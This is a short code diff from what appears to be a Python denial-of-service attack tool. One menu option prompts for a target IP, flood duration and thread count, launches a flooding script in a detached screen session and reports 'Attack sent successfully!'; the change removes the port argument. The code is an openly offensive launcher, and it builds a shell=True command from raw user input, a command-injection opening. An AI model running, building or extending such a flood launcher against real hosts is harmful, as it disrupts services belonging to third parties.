@@ -537,10 +537,9 @@ class Tool:
 			elif option in ['05', '5']:
 				try:
 					ip = str(input(f"{Color.LG} [>] IP: "+Color.RESET))
-					port = int(input(f"{Color.LG} [>] Port: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
-					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {port} {floodtime} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {floodtime} {thread}'], shell=True)
 					print(Color.LG+f"\n [!] Attack sent successfully!\n")
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
